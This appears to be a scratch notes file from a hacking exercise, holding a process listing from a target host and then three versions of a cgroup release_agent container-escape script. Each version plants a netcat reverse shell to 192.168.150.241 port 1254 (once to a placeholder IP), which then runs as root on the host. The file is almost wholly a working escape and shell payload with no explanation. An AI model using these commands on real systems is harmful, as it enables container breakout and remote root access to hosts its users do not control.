root         1     0  0 05:03 pts/0    00:00:00 /bin/bash /root/start.sh
root        49     1  0 05:12 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root       112    49  0 05:12 ?        00:00:00  \_ sshd: skeleton [priv]
skeleton   127   112  0 05:12 ?        00:00:00      \_ sshd: skeleton@pts/1
skeleton   128   127  0 05:12 pts/1    00:00:00          \_ -bash
skeleton   134   128  0 05:14 pts/1    00:00:00              \_ ps -ef --forest
root        76     1  0 05:12 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    81    76  0 05:12 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    82    76  0 05:12 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    83    76  0 05:12 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    84    76  0 05:12 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    85    76  0 05:12 ?        00:00:00  \_ /usr/sbin/apache2 -k start
root        88     1  0 05:12 pts/0    00:00:00 su - cave -c cd /home/cave/src; ./run.sh
cave        89    88  0 05:12 ?        00:00:00  \_ -bash -c cd /home/cave/src; ./run.sh
cave        91    89  0 05:12 ?        00:00:00      \_ /bin/bash ./run.sh
cave       102    91  0 05:12 ?        00:00:00          \_ java -cp .:commons-io-2.7.jar RPG

81 82 83 84 85 89 91 102    

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo '$host_path/cmd' > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'ps aux > $host_path/output' >> /cmd
chmod a+x /cmd
sh -c 'echo \$\$ > /tmp/cgrp/x/cgroup.procs'

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.150.241 1254 > /tmp/f" > /cmd

mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.150.241 1254 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1254 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
